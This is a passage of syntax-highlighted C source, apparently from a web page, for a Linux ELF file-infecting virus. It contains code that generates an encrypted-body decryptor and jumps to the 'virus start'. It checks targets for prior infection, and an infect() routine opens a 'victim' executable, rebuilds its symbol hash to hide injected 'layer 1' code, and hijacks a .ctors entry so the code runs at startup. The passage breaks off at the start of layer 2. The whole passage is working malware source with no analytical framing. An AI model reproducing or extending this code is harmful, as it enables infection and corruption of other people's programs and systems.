			saved_regs<span style="color: black;">&#91;</span>push_count<span style="color: #339933;">++</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> reg<span style="color: #339933;">;</span>
		<span style="color: black;">&#125;</span>
	<span style="color: black;">&#125;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* init vars */</span>
	crc_reg <span style="color: #339933;">=</span> alloc_reg<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>free_regs<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> codegen<span style="color: black;">&#40;</span>cmd_r_c<span style="color: #339933;">,</span> cmd_mov<span style="color: #339933;">,</span> crc_reg<span style="color: #339933;">,</span> key<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	<span style="color: #808080; font-style: italic;">/* initial crc value */</span>
	dst_reg <span style="color: #339933;">=</span> alloc_reg<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>free_regs<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> codegen<span style="color: black;">&#40;</span>cmd_r_c<span style="color: #339933;">,</span> cmd_mov<span style="color: #339933;">,</span> dst_reg<span style="color: #339933;">,</span> src_va<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	<span style="color: #808080; font-style: italic;">/* encrypted body start */</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* loop label */</span>
	label <span style="color: #339933;">=</span> buf<span style="color: #339933;">;</span>	
&nbsp;
	<span style="color: #808080; font-style: italic;">/* crc32b crc_reg, [dst_reg] */</span>
	emit4<span style="color: black;">&#40;</span><span style="color: #208080;">0xf0380ff2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	emit1<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>crc_reg <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span> dst_reg<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* (byte) [dst_reg] &lt;- MSB(crc_reg) */</span>
	<span style="color: #993333;">uint32_t</span> t0<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #339933;">;;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		t0 <span style="color: #339933;">=</span> alloc_reg<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>free_regs<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>t0 <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span>
			<span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span>
		free_reg<span style="color: black;">&#40;</span>t0<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>free_regs<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: black;">&#125;</span>
	codegen<span style="color: black;">&#40;</span>cmd_r_r<span style="color: #339933;">,</span> cmd_mov<span style="color: #339933;">,</span> t0<span style="color: #339933;">,</span> crc_reg<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	emit2<span style="color: black;">&#40;</span><span style="color: #208080;">0xc1</span><span style="color: #339933;">,</span> <span style="color: #208080;">0xe8</span> <span style="color: #339933;">|</span> t0<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	emit1<span style="color: black;">&#40;</span><span style="color: #208080;">0x18</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	<span style="color: #808080; font-style: italic;">/* shr t0, 24 */</span>
	emit2<span style="color: black;">&#40;</span><span style="color: #208080;">0x88</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>t0 <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span> dst_reg<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	<span style="color: #808080; font-style: italic;">/* mov byte [dst_reg], t0 */</span>
	free_reg<span style="color: black;">&#40;</span>t0<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>free_regs<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
	codegen<span style="color: black;">&#40;</span>cmd_r_c<span style="color: #339933;">,</span> cmd_add<span style="color: #339933;">,</span> dst_reg<span style="color: #339933;">,</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	codegen<span style="color: black;">&#40;</span>cmd_r_c<span style="color: #339933;">,</span> cmd_cmp<span style="color: #339933;">,</span> dst_reg<span style="color: #339933;">,</span> src_va <span style="color: #339933;">+</span> src_sz<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* JB loop */</span>
	emit2<span style="color: black;">&#40;</span><span style="color: #208080;">0x0f</span><span style="color: #339933;">,</span> <span style="color: #208080;">0x82</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	emit4<span style="color: black;">&#40;</span><span style="color: #339933;">-</span><span style="color: black;">&#40;</span>buf <span style="color: #339933;">-</span> label <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* restore regs */</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>push_count <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span>
		emit1<span style="color: black;">&#40;</span><span style="color: #208080;">0x61</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">else</span>
	<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>push_count <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
		emit1<span style="color: black;">&#40;</span><span style="color: #208080;">0x58</span> <span style="color: #339933;">|</span> saved_regs<span style="color: black;">&#91;</span><span style="color: #339933;">--</span>push_count<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* jmp virus start */</span>
	<span style="color: #993333;">int</span> length <span style="color: #339933;">=</span> buf <span style="color: #339933;">-</span> orig_buf <span style="color: #339933;">+</span> <span style="color: #0000dd;">5</span><span style="color: #339933;">;</span>
	emit1<span style="color: black;">&#40;</span><span style="color: #208080;">0xe9</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	emit4<span style="color: black;">&#40;</span><span style="color: #339933;">-</span>length<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>sz <span style="color: #339933;">=</span> length<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> length<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span> check_elf_header<span style="color: black;">&#40;</span>Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">-&gt;</span>e_type <span style="color: #339933;">!=</span> ET_EXEC <span style="color: #339933;">||</span> ehdr<span style="color: #339933;">-&gt;</span>e_machine <span style="color: #339933;">!=</span> EM_386 <span style="color: #339933;">||</span>
		ehdr<span style="color: #339933;">-&gt;</span>e_version <span style="color: #339933;">!=</span> EV_CURRENT <span style="color: #339933;">||</span>
		<span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">-&gt;</span>e_ident<span style="color: black;">&#91;</span>EI_OSABI<span style="color: black;">&#93;</span> <span style="color: #339933;">!=</span> ELFOSABI_NONE <span style="color: #339933;">&amp;&amp;</span>
		 ehdr<span style="color: #339933;">-&gt;</span>e_ident<span style="color: black;">&#91;</span>EI_OSABI<span style="color: black;">&#93;</span> <span style="color: #339933;">!=</span> ELFOSABI_TARGET<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* already infected? */</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>ehdr <span style="color: #339933;">+</span> <span style="color: #0000dd;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> Elf32_Shdr <span style="color: #339933;">*</span>find_ctors<span style="color: black;">&#40;</span>Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: #339933;">,</span> Elf32_Shdr <span style="color: #339933;">*</span>shdr<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> ctors<span style="color: black;">&#91;</span><span style="color: #0000dd;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
	<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>ctors <span style="color: #339933;">+</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #208080;">0x6f74632e</span><span style="color: #339933;">;</span>
	<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>ctors <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #208080;">0x00007372</span><span style="color: #339933;">;</span>	
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">-&gt;</span>e_shstrndx <span style="color: #339933;">==</span> SHN_UNDEF<span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">return</span> NULL<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>strtab <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>ehdr <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>ehdr<span style="color: #339933;">-&gt;</span>e_shstrndx<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">;</span>
        <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> ehdr<span style="color: #339933;">-&gt;</span>e_shnum<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a><span style="color: black;">&#40;</span>strtab <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_name</span><span style="color: #339933;">,</span> ctors<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
			<span style="color: #b1b100;">return</span> <span style="color: #339933;">&amp;</span>shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> NULL<span style="color: #339933;">;</span>
&nbsp;
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> Elf32_Phdr <span style="color: #339933;">*</span>find_last_PT_LOAD<span style="color: black;">&#40;</span>Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	Elf32_Phdr <span style="color: #339933;">*</span>phdr<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>ph<span style="color: #339933;">;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	phdr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>ehdr <span style="color: #339933;">+</span> ehdr<span style="color: #339933;">-&gt;</span>e_phoff<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	ph <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> ehdr<span style="color: #339933;">-&gt;</span>e_phnum<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_type</span> <span style="color: #339933;">==</span> PT_LOAD <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span>ph <span style="color: #339933;">==</span> NULL <span style="color: #339933;">||</span> phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_vaddr</span> <span style="color: #339933;">&gt;</span> ph<span style="color: #339933;">-&gt;</span>p_vaddr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
			ph <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> ph<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>find_pmain<span style="color: black;">&#40;</span>Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: #339933;">,</span> Elf32_Shdr <span style="color: #339933;">*</span>shdr<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">,</span> j<span style="color: #339933;">;</span>
        <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> ehdr<span style="color: #339933;">-&gt;</span>e_shnum<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">-&gt;</span>e_entry <span style="color: #339933;">&gt;=</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_addr</span> <span style="color: #339933;">&amp;&amp;</span> ehdr<span style="color: #339933;">-&gt;</span>e_entry <span style="color: #339933;">&lt;</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_addr</span> <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_size</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
			<span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>p <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>ehdr <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">;</span>
			<span style="color: #808080; font-style: italic;">/* FIXME! This is ugly! */</span>
			<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>j <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> j <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">64</span><span style="color: #339933;">;</span> j<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
				<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>p<span style="color: black;">&#91;</span>j<span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #208080;">0x68</span> <span style="color: #339933;">&amp;&amp;</span> p<span style="color: black;">&#91;</span>j <span style="color: #339933;">+</span> <span style="color: #0000dd;">5</span><span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #208080;">0xe8</span><span style="color: black;">&#41;</span>
					<span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>p <span style="color: #339933;">+</span> j <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: black;">&#125;</span>
	<span style="color: #b1b100;">return</span> NULL<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> infect<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>filename<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> h<span style="color: #339933;">,</span> l<span style="color: #339933;">,</span> i<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>m<span style="color: #339933;">;</span>
	Elf32_Ehdr <span style="color: #339933;">*</span>ehdr<span style="color: #339933;">;</span>
	Elf32_Phdr <span style="color: #339933;">*</span>ph<span style="color: #339933;">;</span>
	Elf32_Shdr <span style="color: #339933;">*</span>shdr<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>sh<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>layer1_entry <span style="color: #339933;">=</span> NULL<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>layer2_entry <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> layer2_offs<span style="color: #339933;">,</span> layer2_addr<span style="color: #339933;">;</span>	
	<span style="color: #993333;">int</span> tl<span style="color: #339933;">,</span> dl<span style="color: #339933;">;</span>
	Elf32_Sym <span style="color: #339933;">*</span>sym<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>str<span style="color: #339933;">;</span>	
	<span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>buf<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>src<span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* open victim, check size, mmap... */</span>	
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>h <span style="color: #339933;">=</span> open<span style="color: black;">&#40;</span>filename<span style="color: #339933;">,</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">return</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>l <span style="color: #339933;">=</span> lseek<span style="color: black;">&#40;</span>h<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> MIN_VICTIM_SIZE <span style="color: #339933;">||</span> l <span style="color: #339933;">&gt;</span> MAX_VICTIM_SIZE<span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _close<span style="color: #339933;">;</span>
	m <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>mmap<span style="color: black;">&#40;</span><span style="color: #208080;">0x1000</span><span style="color: #339933;">,</span> l<span style="color: #339933;">,</span> PROT_READ<span style="color: #339933;">|</span>PROT_WRITE<span style="color: #339933;">,</span> MAP_SHARED<span style="color: #339933;">,</span> h<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>m <span style="color: #339933;">&gt;</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #208080;">0xfffff000</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _close<span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* check ELF header */</span>
	ehdr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span>m<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>check_elf_header<span style="color: black;">&#40;</span>ehdr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _unmap<span style="color: #339933;">;</span>	
	shdr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Shdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> ehdr<span style="color: #339933;">-&gt;</span>e_shoff<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #808080; font-style: italic;">/* WRITE LAYER 1 */</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>sh <span style="color: #339933;">=</span> find_ctors<span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">,</span> shdr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _unmap<span style="color: #339933;">;</span>
	layer1_entry <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">-</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>sh <span style="color: #339933;">=</span> NULL<span style="color: #339933;">,</span> i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> ehdr<span style="color: #339933;">-&gt;</span>e_shnum<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_type</span> <span style="color: #339933;">==</span> SHT_HASH<span style="color: black;">&#41;</span>
			sh <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>sh <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _unmap<span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* find symbol table and strings */</span>
	i <span style="color: #339933;">=</span> sh<span style="color: #339933;">-&gt;</span>sh_link<span style="color: #339933;">;</span>
	sym <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Sym<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	i <span style="color: #339933;">=</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_link</span><span style="color: #339933;">;</span>
	str <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* rebuild hash */</span>
	<span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> nb <span style="color: #339933;">=</span> hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> nc <span style="color: #339933;">=</span> hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">int</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>nb <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>layer1_size <span style="color: #339933;">+</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _unmap<span style="color: #339933;">;</span>
	bzero<span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>nb <span style="color: #339933;">+</span> nc <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	nb <span style="color: #339933;">-=</span> <span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>layer1_size <span style="color: #339933;">+</span> <span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>
	build_hash<span style="color: black;">&#40;</span>hash<span style="color: #339933;">,</span> nb<span style="color: #339933;">,</span> nc<span style="color: #339933;">,</span> sym<span style="color: #339933;">,</span> str<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* write layer 1 */</span>
	i <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span> <span style="color: #339933;">+</span> nb <span style="color: #339933;">+</span> nc<span style="color: black;">&#41;</span> <span style="color: #339933;">*</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset <span style="color: #339933;">+</span> i<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>g<span style="color: #339933;">-&gt;</span>layer1_addr<span style="color: #339933;">,</span> g<span style="color: #339933;">-&gt;</span>layer1_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* update .ctors */</span>
	layer1_entry<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #208080;">0xffffffff</span><span style="color: #339933;">;</span>
	layer1_entry<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> sh<span style="color: #339933;">-&gt;</span>sh_addr <span style="color: #339933;">+</span> i<span style="color: #339933;">;</span>
&nbsp;
<span style="color: #808080; font-style: italic;">/* WRITE LAYER 2 */</span>
